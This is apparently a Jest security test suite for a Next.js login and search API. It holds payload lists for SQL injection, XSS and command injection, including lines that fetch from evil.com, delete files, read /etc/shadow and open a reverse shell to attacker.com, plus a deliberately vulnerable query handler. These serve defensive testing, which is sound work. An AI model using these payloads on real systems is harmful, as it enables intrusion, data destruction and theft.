import { describe, it, expect, beforeAll, afterAll, beforeEach } from '@jest/globals';
import { NextRequest, NextResponse } from 'next/server';
import jwt from 'jsonwebtoken';
import bcrypt from 'bcryptjs';
import crypto from 'crypto';

// Security test utilities
class SecurityTestUtils {
  static generateSQLInjectionPayloads(): string[] {
    return [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "' UNION SELECT * FROM users --",
      "'; INSERT INTO users (email, password) VALUES ('hacker@evil.com', 'password'); --",
      "' OR 1=1 --",
      "admin'--",
      "admin'/*",
      "' OR 'x'='x",
      "') OR ('1'='1",
      "' OR 1=1#",
    ];
  }

  static generateXSSPayloads(): string[] {
    return [
      "<script>alert('XSS')</script>",
      "javascript:alert('XSS')",
      "<img src=x onerror=alert('XSS')>",
      "<svg onload=alert('XSS')>",
      "<iframe src=javascript:alert('XSS')></iframe>",
      "<body onload=alert('XSS')>",
      "<input onfocus=alert('XSS') autofocus>",
      "<select onfocus=alert('XSS') autofocus>",
      "<textarea onfocus=alert('XSS') autofocus>",
      "<keygen onfocus=alert('XSS') autofocus>",
    ];
  }

  static generateCommandInjectionPayloads(): string[] {
    return [
      "; ls -la",
      "| cat /etc/passwd",
      "&& rm -rf /",
      "; cat /etc/shadow",
      "| nc -l 4444",
      "; wget http://evil.com/malware",
      "&& curl http://evil.com/steal-data",
      "; python -c 'import os; os.system(\"rm -rf /\")'",
      "| bash -i >& /dev/tcp/attacker.com/8080 0>&1",
      "; /bin/bash",
    ];
  }

  static generateLongStrings(): string[] {
    return [
      'A'.repeat(1000),
      'A'.repeat(10000),
      'A'.repeat(100000),
      '\x00'.repeat(1000), // Null bytes
      '\n'.repeat(1000), // Newlines
      '\r'.repeat(1000), // Carriage returns
    ];
  }

  static generateInvalidTokens(): string[] {
    return [
      'invalid.token.here',
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature',
      '', // Empty token
      'Bearer', // Just Bearer
      'null',
      'undefined',
      '{}',
      'admin',
      '../../etc/passwd',
      '<script>alert("xss")</script>',
    ];
  }

  static async hashPassword(password: string): Promise<string> {
    return bcrypt.hash(password, 10);
  }

  static generateValidJWT(payload: any, secret: string = 'test-secret'): string {
    return jwt.sign(payload, secret, { expiresIn: '1h' });
  }

  static generateExpiredJWT(payload: any, secret: string = 'test-secret'): string {
    return jwt.sign(payload, secret, { expiresIn: '-1h' });
  }
}

// Mock API handlers for security testing
const mockPrisma = {
  user: {
    findUnique: jest.fn(),
    findMany: jest.fn(),
    create: jest.fn(),
    update: jest.fn(),
  },
  product: {
    findMany: jest.fn(),
    create: jest.fn(),
  },
  $queryRaw: jest.fn(),
  $executeRaw: jest.fn(),
};

// Mock vulnerable endpoint for testing
const vulnerableSearchHandler = async (req: NextRequest) => {
  const url = new URL(req.url);
  const query = url.searchParams.get('q');
  
  if (!query) {
    return NextResponse.json({ error: 'Query required' }, { status: 400 });
  }

  // Simulate SQL injection vulnerability (for testing purposes)
  try {
    // This would be vulnerable in real code - DON'T DO THIS
    const results = await mockPrisma.$queryRaw`
      SELECT * FROM products WHERE name LIKE '%${query}%'
    `;
    
    return NextResponse.json({ results });
  } catch (error) {
    return NextResponse.json({ error: 'Database error' }, { status: 500 });
  }
};

// Secure search handler for comparison
const secureSearchHandler = async (req: NextRequest) => {
  const url = new URL(req.url);
  const query = url.searchParams.get('q');
  
  if (!query) {
    return NextResponse.json({ error: 'Query required' }, { status: 400 });
  }

  // Input validation
  if (query.length > 100) {
    return NextResponse.json({ error: 'Query too long' }, { status: 400 });
  }

  // Sanitize input
  const sanitizedQuery = query.replace(/[<>"'&]/g, '');
  
  try {
    // Use parameterized queries
    const results = await mockPrisma.product.findMany({
      where: {
        name: {
          contains: sanitizedQuery,
          mode: 'insensitive',
        },
      },
    });
    
    return NextResponse.json({ results });
  } catch (error) {
    return NextResponse.json({ error: 'Database error' }, { status: 500 });
  }
};

// Authentication handler with security measures
const secureAuthHandler = async (req: NextRequest) => {
  const body = await req.json();
  const { email, password } = body;

  // Rate limiting simulation
  const clientIP = req.headers.get('x-forwarded-for') || 'unknown';
  
  // Input validation
  if (!email || !password) {
    return NextResponse.json(
      { error: 'Email and password are required' },
      { status: 400 }
    );
  }

  if (email.length > 254 || password.length > 128) {
    return NextResponse.json(
      { error: 'Input too long' },
      { status: 400 }
    );
  }

  // Email format validation
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (!emailRegex.test(email)) {
    return NextResponse.json(
      { error: 'Invalid email format' },
      { status: 400 }
    );
  }

  // Check for suspicious patterns
  const suspiciousPatterns = [
    /<script/i,
    /javascript:/i,
    /on\w+=/i,
    /\bor\b.*\b1\s*=\s*1\b/i,
    /union.*select/i,
    /drop.*table/i,
  ];

  const isSuspicious = suspiciousPatterns.some(pattern => 
    pattern.test(email) || pattern.test(password)
  );

  if (isSuspicious) {
    return NextResponse.json(
      { error: 'Invalid input detected' },
      { status: 400 }
    );
  }

  try {
    const user = await mockPrisma.user.findUnique({
      where: { email },
    });

    if (!user) {
      // Constant time delay to prevent timing attacks
      await new Promise(resolve => setTimeout(resolve, 100));
      return NextResponse.json(
        { error: 'Invalid credentials' },
        { status: 401 }
      );
    }

    const isValid = await bcrypt.compare(password, user.password);
    if (!isValid) {
      return NextResponse.json(
        { error: 'Invalid credentials' },
        { status: 401 }
      );
    }

    // Generate secure token
    const token = jwt.sign(
      { 
        userId: user.id, 
        email: user.email,
        iat: Math.floor(Date.now() / 1000),
      },
      process.env.JWT_SECRET || 'test-secret',
      { 
        expiresIn: '15m',
        issuer: 'md-sports',
        audience: 'md-sports-client',
      }
    );

    return NextResponse.json({
      user: {
        id: user.id,
        email: user.email,
        name: user.name,
      },
      token,
    });
  } catch (error) {
    return NextResponse.json(
      { error: 'Internal server error' },
      { status: 500 }
    );
  }
};

describe('Security Tests', () => {
  beforeAll(() => {
    process.env.JWT_SECRET = 'test-secret-key-for-security-testing';
  });

  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('SQL Injection Protection', () => {
    it('should prevent SQL injection in search queries', async () => {
      const sqlPayloads = SecurityTestUtils.generateSQLInjectionPayloads();
      
      for (const payload of sqlPayloads) {
        const request = new NextRequest(
          `http://localhost:3000/api/search?q=${encodeURIComponent(payload)}`
        );

        // Test with secure handler
        const response = await secureSearchHandler(request);
        
        // Should not return 500 error or expose database structure
        expect(response.status).not.toBe(500);
        
        const data = await response.json();
        expect(data).not.toHaveProperty('results');
      }
    });

    it('should use parameterized queries', async () => {
      mockPrisma.product.findMany.mockResolvedValue([]);
      
      const request = new NextRequest(
        "http://localhost:3000/api/search?q=test' OR '1'='1"
      );

      await secureSearchHandler(request);
      
      // Verify parameterized query was used
      expect(mockPrisma.product.findMany).toHaveBeenCalledWith({
        where: {
          name: {
            contains: "test OR 11", // Sanitized
            mode: 'insensitive',
          },
        },
      });
    });
  });

  describe('XSS Protection', () => {
    it('should sanitize XSS payloads in input', async () => {
      const xssPayloads = SecurityTestUtils.generateXSSPayloads();
      
      for (const payload of xssPayloads) {
        const request = new NextRequest(
          `http://localhost:3000/api/search?q=${encodeURIComponent(payload)}`
        );

        const response = await secureSearchHandler(request);
        const data = await response.json();
        
        // Should not contain script tags or javascript
        if (data.results) {
          const responseStr = JSON.stringify(data);
          expect(responseStr).not.toMatch(/<script/i);
          expect(responseStr).not.toMatch(/javascript:/i);
          expect(responseStr).not.toMatch(/on\w+=/i);
        }
      }
    });

    it('should reject suspicious input patterns', async () => {
      const request = new NextRequest('http://localhost:3000/api/auth/login', {
        method: 'POST',
        body: JSON.stringify({
          email: '<script>alert("xss")</script>@test.com',
          password: 'password123',
        }),
        headers: {
          'Content-Type': 'application/json',
        },
      });

      const response = await secureAuthHandler(request);
      const data = await response.json();
      
      expect(response.status).toBe(400);
      expect(data.error).toBe('Invalid input detected');
    });
  });

  describe('Authentication Security', () => {
    it('should reject invalid JWT tokens', async () => {
      const invalidTokens = SecurityTestUtils.generateInvalidTokens();
      
      for (const token of invalidTokens) {
        expect(() => {
          jwt.verify(token, process.env.JWT_SECRET!);
        }).toThrow();
      }
    });

    it('should reject expired tokens', async () => {
      const expiredToken = SecurityTestUtils.generateExpiredJWT({
        userId: 1,
        email: 'test@example.com',
      });
      
      expect(() => {
        jwt.verify(expiredToken, process.env.JWT_SECRET!);
      }).toThrow('jwt expired');
    });

    it('should use secure password hashing', async () => {
      const password = 'testpassword123';
      const hash = await SecurityTestUtils.hashPassword(password);
      
      // Should be bcrypt hash
      expect(hash).toMatch(/^\$2[aby]\$\d+\$/);
      
      // Should not be the original password
      expect(hash).not.toBe(password);
      
      // Should verify correctly
      const isValid = await bcrypt.compare(password, hash);
      expect(isValid).toBe(true);
      
      // Should not verify with wrong password
      const isInvalid = await bcrypt.compare('wrongpassword', hash);
      expect(isInvalid).toBe(false);
    });

    it('should prevent timing attacks in authentication', async () => {
      const validEmail = 'test@example.com';
      const invalidEmail = 'nonexistent@example.com';
      
      // Mock user lookup
      mockPrisma.user.findUnique.mockImplementation(({ where }) => {
        if (where.email === validEmail) {
          return Promise.resolve({
            id: 1,
            email: validEmail,
            password: '$2a$10$hashedPassword',
            name: 'Test User',
          });
        }
        return Promise.resolve(null);
      });

      const validRequest = new NextRequest('http://localhost:3000/api/auth/login', {
        method: 'POST',
        body: JSON.stringify({
          email: validEmail,
          password: 'wrongpassword',
        }),
        headers: {
          'Content-Type': 'application/json',
        },
      });

      const invalidRequest = new NextRequest('http://localhost:3000/api/auth/login', {
        method: 'POST',
        body: JSON.stringify({
          email: invalidEmail,
          password: 'wrongpassword',
        }),
        headers: {
          'Content-Type': 'application/json',
        },
      });

      // Measure response times
      const start1 = Date.now();
      const response1 = await secureAuthHandler(validRequest);
      const time1 = Date.now() - start1;

      const start2 = Date.now();
      const response2 = await secureAuthHandler(invalidRequest);
      const time2 = Date.now() - start2;

      // Both should return 401
      expect(response1.status).toBe(401);
      expect(response2.status).toBe(401);
      
      // Response times should be similar (within 50ms)
      expect(Math.abs(time1 - time2)).toBeLessThan(50);
    });
  });

  describe('Input Validation', () => {
    it('should reject oversized inputs', async () => {
      const longStrings = SecurityTestUtils.generateLongStrings();
      
      for (const longString of longStrings) {
        const request = new NextRequest('http://localhost:3000/api/auth/login', {
          method: 'POST',
          body: JSON.stringify({
            email: longString,
            password: 'password123',
          }),
          headers: {
            'Content-Type': 'application/json',
          },
        });

        const response = await secureAuthHandler(request);
        
        expect(response.status).toBe(400);
      }
    });

    it('should validate email format', async () => {
      const invalidEmails = [
        'invalid-email',
        '@domain.com',
        'user@',
        'user..name@domain.com',
        'user@domain',
        '',
        'user name@domain.com',
      ];
      
      for (const email of invalidEmails) {
        const request = new NextRequest('http://localhost:3000/api/auth/login', {
          method: 'POST',
          body: JSON.stringify({
            email,
            password: 'password123',
          }),
          headers: {
            'Content-Type': 'application/json',
          },
        });

        const response = await secureAuthHandler(request);
        const data = await response.json();
        
        expect(response.status).toBe(400);
        expect(data.error).toBe('Invalid email format');
      }
    });

    it('should handle null bytes and special characters', async () => {
      const maliciousInputs = [
        'test\x00@example.com',
        'test\r\n@example.com',
        'test\t@example.com',
        'test\b@example.com',
      ];
      
      for (const input of maliciousInputs) {
        const request = new NextRequest('http://localhost:3000/api/auth/login', {
          method: 'POST',
          body: JSON.stringify({
            email: input,
            password: 'password123',
          }),
          headers: {
            'Content-Type': 'application/json',
          },
        });

        const response = await secureAuthHandler(request);
        
        expect(response.status).toBe(400);
      }
    });
  });

  describe('Command Injection Protection', () => {
    it('should prevent command injection in file operations', () => {
      const commandPayloads = SecurityTestUtils.generateCommandInjectionPayloads();
      
      for (const payload of commandPayloads) {
        // Simulate file name validation
        const isValidFileName = (filename: string): boolean => {
          // Only allow alphanumeric, dots, hyphens, and underscores
          return /^[a-zA-Z0-9._-]+$/.test(filename);
        };
        
        expect(isValidFileName(payload)).toBe(false);
      }
    });
  });

  describe('JWT Security', () => {
    it('should use secure JWT configuration', () => {
      const payload = { userId: 1, email: 'test@example.com' };
      const token = SecurityTestUtils.generateValidJWT(payload);
      
      const decoded = jwt.verify(token, process.env.JWT_SECRET!) as any;
      
      expect(decoded.userId).toBe(1);
      expect(decoded.email).toBe('test@example.com');
      expect(decoded.iat).toBeDefined();
      expect(decoded.exp).toBeDefined();
    });

    it('should not accept tokens with none algorithm', () => {
      // Create a token with 'none' algorithm (security vulnerability)
      const header = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
      const payload = Buffer.from(JSON.stringify({ userId: 1, email: 'test@example.com' })).toString('base64url');
      const noneToken = `${header}.${payload}.`;
      
      expect(() => {
        jwt.verify(noneToken, process.env.JWT_SECRET!);
      }).toThrow();
    });

    it('should validate token signature', () => {
      const validToken = SecurityTestUtils.generateValidJWT({ userId: 1 });
      const [header, payload] = validToken.split('.');
      const tamperedToken = `${header}.${payload}.tampered_signature`;
      
      expect(() => {
        jwt.verify(tamperedToken, process.env.JWT_SECRET!);
      }).toThrow('invalid signature');
    });
  });

  describe('Rate Limiting Simulation', () => {
    it('should handle rapid successive requests', async () => {
      const requests = Array.from({ length: 100 }, () => 
        new NextRequest('http://localhost:3000/api/auth/login', {
          method: 'POST',
          body: JSON.stringify({
            email: 'test@example.com',
            password: 'password123',
          }),
          headers: {
            'Content-Type': 'application/json',
            'X-Forwarded-For': '192.168.1.100',
          },
        })
      );

      // In a real implementation, this would trigger rate limiting
      const responses = await Promise.all(
        requests.map(req => secureAuthHandler(req))
      );

      // All requests should be processed (in real app, some would be rate limited)
      responses.forEach(response => {
        expect([400, 401, 429]).toContain(response.status); // 429 = Too Many Requests
      });
    });
  });

  describe('Error Handling Security', () => {
    it('should not expose sensitive information in error messages', async () => {
      // Simulate database error
      mockPrisma.user.findUnique.mockRejectedValue(new Error('Connection failed to database "md_sports" on host "localhost"'));
      
      const request = new NextRequest('http://localhost:3000/api/auth/login', {
        method: 'POST',
        body: JSON.stringify({
          email: 'test@example.com',
          password: 'password123',
        }),
        headers: {
          'Content-Type': 'application/json',
        },
      });

      const response = await secureAuthHandler(request);
      const data = await response.json();
      
      expect(response.status).toBe(500);
      expect(data.error).toBe('Internal server error');
      expect(data.error).not.toContain('database');
      expect(data.error).not.toContain('localhost');
      expect(data.error).not.toContain('md_sports');
    });

    it('should use generic error messages for authentication failures', async () => {
      mockPrisma.user.findUnique.mockResolvedValue(null);
      
      const request = new NextRequest('http://localhost:3000/api/auth/login', {
        method: 'POST',
        body: JSON.stringify({
          email: 'nonexistent@example.com',
          password: 'password123',
        }),
        headers: {
          'Content-Type': 'application/json',
        },
      });

      const response = await secureAuthHandler(request);
      const data = await response.json();
      
      expect(response.status).toBe(401);
      expect(data.error).toBe('Invalid credentials');
      expect(data.error).not.toContain('user not found');
      expect(data.error).not.toContain('email');
    });
  });
});